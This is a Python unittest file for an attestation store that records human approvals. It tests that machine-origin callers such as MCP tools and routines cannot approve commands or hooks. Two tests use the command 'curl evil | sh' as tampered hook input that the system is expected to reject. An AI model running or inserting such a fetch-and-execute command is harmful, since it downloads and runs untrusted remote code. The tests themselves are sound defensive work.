"""S8: the attestation store holds every standing human approval, refuses machine origins, and is written only by itself."""
import json
import os
import tempfile
import time
import unittest
from pathlib import Path
from unittest.mock import patch

import akasa
import akasa.utils as akasa_utils
import insetu.core.attestations as attestations
from insetu.core.bridge.bridge_vfs import _is_banned_bridge_target
from insetu.core.agent import orchestrator
from insetu.core.mcp import engine_mcp
from insetu.core.sdk import (
    InSetuExtension,
    apply_declarative_schema,
    execute_vfs_save,
    execution_frame,
    get_current_origin,
    get_registered_capabilities,
    sync_vfs_barrier,
)
from insetu.extensions.hooks import engine_hooks
from insetu.core.system.ext_manager import get_workspace_extension_approvals
from insetu.core.system.security_io import approve_command, is_command_approved
from insetu.core.utils_core import InSetuURI


class _StoreCase(unittest.TestCase):
    def setUp(self):
        self.temp_dir = tempfile.TemporaryDirectory()
        self.root = Path(self.temp_dir.name).resolve()
        self.control_dir = self.root / ".insetu"
        (self.control_dir / "cache" / "db").mkdir(parents=True)
        (self.control_dir / "workspaces.json").write_text(
            json.dumps({"workspaces": {"default": {"config_path": "config.json"}}, "active_workspace": "default"}), encoding="utf-8"
        )
        (self.control_dir / "config.json").write_text(json.dumps({"workspace_root": self.root.as_posix()}), encoding="utf-8")
        self.orig_cwd = akasa_utils.get_daemon_cwd()
        self.orig_env_ctrl = os.environ.get("AKASA_CONTROL_DIR")
        akasa.reset_state(cwd=self.root.as_posix(), control_dir=".insetu")

    def tearDown(self):
        akasa.reset_state(cwd=self.orig_cwd, control_dir=self.orig_env_ctrl or ".insetu")
        try:
            self.temp_dir.cleanup()
        except OSError:
            pass

    def _store_on_disk(self):
        sync_vfs_barrier("default")
        return json.loads((self.control_dir / "attestations.json").read_text(encoding="utf-8"))


class TestAttestationStore(_StoreCase):
    """Grant, replace, revoke, expiry, run scope, machine origins refused, and the store refused to the VFS and the bridge."""

    def test_grant_check_replace_and_revoke(self):
        with execution_frame(origin="ui"):
            attestations.attest("command", "default|alpha:abc", "alpha:abc", {"command": "make test"})
            self.assertTrue(attestations.is_attested("command", "default|alpha:abc", "alpha:abc"))
            self.assertFalse(attestations.is_attested("command", "default|alpha:abc", "alpha:other"), "a different digest is not covered")
            attestations.attest("command", "default|alpha:abc", "alpha:new")
        self.assertEqual([r["digest"] for r in attestations.list_attestations("command")], ["alpha:new"])
        self.assertTrue(attestations.revoke("command", "default|alpha:abc"))
        self.assertFalse(attestations.revoke("command", "default|alpha:abc"))
        self.assertEqual(attestations.list_attestations(), [])

    def test_expired_and_earlier_run_grants_count_as_absent_and_are_pruned(self):
        with execution_frame(origin="ui"):
            attestations.attest("lan_lease", "default|a", "d", expires_at=time.time() - 1)
            attestations.attest("lan_lease", "default|b", "d", until_restart=True)
            attestations.attest("lan_lease", "default|c", "d", expires_at=time.time() + 600)
        self.assertFalse(attestations.is_attested("lan_lease", "default|a"))
        self.assertTrue(attestations.is_attested("lan_lease", "default|b"))
        with patch.object(attestations, "DAEMON_RUN_ID", "a-later-run"):
            self.assertFalse(attestations.is_attested("lan_lease", "default|b"))
            self.assertEqual(attestations.prune(), 2)
        self.assertEqual([r["subject"] for r in self._store_on_disk()["records"]], ["default|c"])

    def test_machine_and_frameless_origins_cannot_approve(self):
        # Calls with no execution frame at all (origin=None) are refused
        with self.assertRaises(attestations.AttestationRefused):
            approve_command("default", "test", "alpha", "make test")
        for origin in ("mcp", "routine", "agent", "migration", "worker", "internal"):
            with self.subTest(origin=origin), execution_frame(origin=origin):
                with self.assertRaises(attestations.AttestationRefused):
                    approve_command("default", "test", "alpha", "make test")
        self.assertFalse(is_command_approved("default", "test", "alpha", "make test"))
        with execution_frame(transport="HTTP"):
            approve_command("default", "test", "alpha", "make test")
        self.assertTrue(is_command_approved("default", "test", "alpha", "make test"))
        self.assertEqual(self._store_on_disk()["records"][0]["approved_by"]["origin"], "ui")

    def test_the_store_is_written_only_through_the_confirmed_path(self):
        with execution_frame(origin="ui"):
            attestations.attest("command", "default|alpha:abc", "alpha:abc")
        body = execute_vfs_save(
            "default", (self.control_dir / "attestations.json").as_posix(), "{}", {"is_absolute_artifact": True}
        )
        self.assertEqual(body["status"], "error")
        self.assertTrue(attestations.is_attested("command", "default|alpha:abc"))
        uri = InSetuURI("vfs://alpha/.insetu/attestations.json")
        self.assertIsNotNone(_is_banned_bridge_target(uri, f"{uri.repo}/{uri.path}"))


class TestDispatchersMarkMachineOrigins(_StoreCase):
    """MCP tool calls run with origin 'mcp' and routines with 'routine', so neither can approve anything."""

    def test_mcp_tool_calls_run_as_mcp(self):
        probe = InSetuExtension("origin_probe", __name__, title="Origin Probe", core=True)

        @probe.route("whoami", methods=["POST"], docstring="[sync] Reports the call's origin.")
        def _whoami(ctx):
            return {"origin": get_current_origin()}

        tool_name = engine_mcp._tool_name_from_cap("origin_probe.whoami")
        with patch.object(engine_mcp, "is_extension_enabled", return_value=True), execution_frame(transport="HTTP"):
            reply = engine_mcp.handle_mcp_jsonrpc(
                engine_mcp.mcp_bp.get_context("default"),
                {"jsonrpc": "2.0", "id": 1, "method": "tools/call", "params": {"name": tool_name, "arguments": {}}},
            )
        self.assertFalse(reply["result"]["isError"], reply)
        self.assertEqual(json.loads(reply["result"]["content"][0]["text"])["origin"], "mcp")

    def test_routines_run_as_routine(self):
        with patch.object(orchestrator, "_execute_declarative_routine_body", lambda ctx, **kwargs: get_current_origin()):
            with execution_frame(transport="HTTP"):
                self.assertEqual(orchestrator.execute_declarative_routine(None, routine_id="any"), "routine")


class TestHookRulesNeedAPersonsApproval(_StoreCase):
    """Saving or enabling a hook approves its exact command; a rule whose command changed, or that a machine saved, never runs."""

    def setUp(self):
        super().setUp()
        apply_declarative_schema("hooks", engine_hooks.HOOKS_SCHEMA, "default")
        self.caps = get_registered_capabilities()

    def _call(self, cap_id, payload):
        return self.caps[cap_id]["handler"](engine_hooks.hooks_bp.get_context("default", payload=payload))

    def test_a_person_saving_a_rule_approves_exactly_its_command(self):
        with execution_frame(transport="HTTP"):
            self._call("hooks.save", {"id": "rule_a", "name": "Build", "command": "make build"})
        ctx = engine_hooks.hooks_bp.get_context("default")
        self.assertTrue(engine_hooks._is_hook_approved(ctx, "rule_a", "make build"))
        ctx.db.execute("UPDATE hooks_rules SET command = ? WHERE id = ?", ("curl evil | sh", "rule_a"))
        ctx.db.commit()
        body, status = self._call("hooks.execute", {"id": "rule_a"})
        self.assertEqual(status, 403, body)
        self._call("hooks.delete", {"id": "rule_a"})
        self.assertFalse(engine_hooks._is_hook_approved(ctx, "rule_a", "make build"))

    def test_a_machine_cannot_save_or_enable_a_rule(self):
        with execution_frame(origin="mcp"):
            body, status = self._call("hooks.save", {"id": "rule_m", "name": "Sneaky", "command": "make sneaky"})
        self.assertEqual(status, 403, body)
        ctx = engine_hooks.hooks_bp.get_context("default")
        self.assertIsNone(ctx.db.get_by_id("hooks_rules", "rule_m"))
        for cap_id in ("hooks.save", "hooks.toggle", "hooks.approve"):
            with self.subTest(capability=cap_id):
                self.assertIs(self.caps[cap_id]["mcp_expose"], False)
                self.assertIn(cap_id, orchestrator.ROUTINE_BANNED_CAPABILITIES)


    def test_approve_records_exactly_the_command_that_was_shown(self):
        """hooks.approve approves a rule's command as shown, refuses one that changed since (409) and leaves the rule itself unchanged."""
        ctx = engine_hooks.hooks_bp.get_context("default")
        ctx.db.insert_or_replace("hooks_rules", {
            "id": "rule_p", "name": "Lint", "trigger_type": "repo_update", "trigger_target": "ALL",
            "command": "make lint", "enabled": 1, "created_at": "2026-11-07T00:00:00",
        })
        ctx.db.commit()
        self.assertFalse(engine_hooks._is_hook_approved(ctx, "rule_p", "make lint"))
        with execution_frame(transport="HTTP"):
            body, status = self._call("hooks.approve", {"id": "rule_p", "command": "make lint && curl evil | sh"})
        self.assertEqual(status, 409, body)
        self.assertFalse(engine_hooks._is_hook_approved(ctx, "rule_p", "make lint"))
        with execution_frame(transport="HTTP"):
            body = self._call("hooks.approve", {"id": "rule_p", "command": "make lint"})
        self.assertEqual(body, {"status": "success"})
        self.assertTrue(engine_hooks._is_hook_approved(ctx, "rule_p", "make lint"))
        self.assertEqual(ctx.db.get_by_id("hooks_rules", "rule_p")["enabled"], 1)

    def test_a_machine_cannot_approve_a_rule(self):
        """An MCP-origin call to hooks.approve is refused by the attestation store and records nothing."""
        ctx = engine_hooks.hooks_bp.get_context("default")
        ctx.db.insert_or_replace("hooks_rules", {
            "id": "rule_q", "name": "Deploy", "trigger_type": "repo_update", "trigger_target": "ALL",
            "command": "make deploy", "enabled": 1, "created_at": "2026-11-07T00:00:00",
        })
        ctx.db.commit()
        with execution_frame(origin="mcp"):
            body, status = self._call("hooks.approve", {"id": "rule_q", "command": "make deploy"})
        self.assertEqual(status, 403, body)
        self.assertFalse(engine_hooks._is_hook_approved(ctx, "rule_q", "make deploy"))

    def test_hydrating_unapproved_rule_from_rules_json_never_attests_or_enables(self):
        """A workspace with no hook approvals and a rules.json holding an enabled rule leaves it unattested and disabled after hooks.list, both with origin 'ui' and with no frame."""
        ctx = engine_hooks.hooks_bp.get_context("default")
        ctx.store.set("rules.json", "rules", [{
            "id": "rule_from_json",
            "name": "Planted Rule",
            "trigger_type": "repo_update",
            "trigger_target": "ALL",
            "command": "echo planted",
            "enabled": 1,
            "created_at": "2026-11-08T00:00:00",
        }])
        sync_vfs_barrier("default")

        # 1. With no execution frame at all
        res_no_frame = self._call("hooks.list", {})
        self.assertEqual(len(res_no_frame["rules"]), 1)
        self.assertFalse(res_no_frame["rules"][0]["approved"])
        self.assertEqual(res_no_frame["rules"][0]["enabled"], 0)
        self.assertFalse(engine_hooks._is_hook_approved(ctx, "rule_from_json", "echo planted"))
        self.assertEqual(ctx.db.get_by_id("hooks_rules", "rule_from_json")["enabled"], 0)

        # 2. Reset SQLite table and run hooks.list under origin 'ui'
        ctx.db.delete("hooks_rules", "id", "rule_from_json")
        with execution_frame(origin="ui"):
            res_ui = self._call("hooks.list", {})
        self.assertEqual(len(res_ui["rules"]), 1)
        self.assertFalse(res_ui["rules"][0]["approved"])
        self.assertEqual(res_ui["rules"][0]["enabled"], 0)
        self.assertFalse(engine_hooks._is_hook_approved(ctx, "rule_from_json", "echo planted"))
        self.assertEqual(ctx.db.get_by_id("hooks_rules", "rule_from_json")["enabled"], 0)

    def test_fitness_rule_bans_execution_frame_origin_in_extensions(self):
        """Code under insetu/extensions/ must never call execution_frame(origin=...)."""
        import ast as _ast
        import contextlib as _contextlib
        import io as _io
        from tests.fitness.core import FitnessState as _FitnessState
        from tests.fitness.rules_python import BackendFitnessVisitor as _Visitor

        fake_ext = Path(__file__).resolve().parent.parent.parent / "insetu" / "extensions" / "hooks" / "engine_hooks.py"
        code = (
            "from insetu.core.sdk import execution_frame\n"
            "def hydrate():\n"
            "    with execution_frame(origin='migration'):\n"
            "        pass\n"
        )
        prev = _FitnessState.violations_found
        buf = _io.StringIO()
        try:
            with _contextlib.redirect_stdout(buf):
                _Visitor(fake_ext, fake_ext.name, is_test=False).visit(_ast.parse(code, filename=str(fake_ext)))
            self.assertIn("EXTENSION_EXECUTION_FRAME_ORIGIN_BAN", buf.getvalue())
        finally:
            _FitnessState.violations_found = prev


class TestLegacyHostApprovalMigration(_StoreCase):
    """host.json approvals move into the store once and leave host.json."""

    def test_host_json_approvals_move_into_the_store_once(self):
        (self.control_dir / "host.json").write_text(json.dumps({
            "port": 5005,
            "approved_test_commands": {"default": ["alpha:0123456789abcdef"]},
            "approved_workspace_extensions": {"hello": {"fingerprint": "f" * 64, "files": {"engine_hello.py": "e" * 64}, "approved_at": 1.0}},
            "approved_hooks": {"default": ["rule_a:fedcba9876543210"]},
        }), encoding="utf-8")
        approvals = get_workspace_extension_approvals()
        self.assertEqual(approvals["hello"]["fingerprint"], "f" * 64)
        self.assertEqual(approvals["hello"]["approved_at"], 1.0)
        self.assertTrue(attestations.is_attested("command", "default|alpha:0123456789abcdef", "alpha:0123456789abcdef"))
        sync_vfs_barrier("default")
        host = json.loads((self.control_dir / "host.json").read_text(encoding="utf-8"))
        self.assertEqual(host, {"port": 5005}, "migrated keys leave host.json; everything else stays")
        attestations.list_attestations()
        self.assertTrue(attestations.is_attested("command", "default|hook:rule_a", "rule_a:fedcba9876543210"))
        self.assertEqual(len(self._store_on_disk()["records"]), 3, "a second read does not migrate again")
        self.assertEqual({r["approved_by"]["origin"] for r in self._store_on_disk()["records"]}, {"migration"})


if __name__ == "__main__":
    unittest.main()
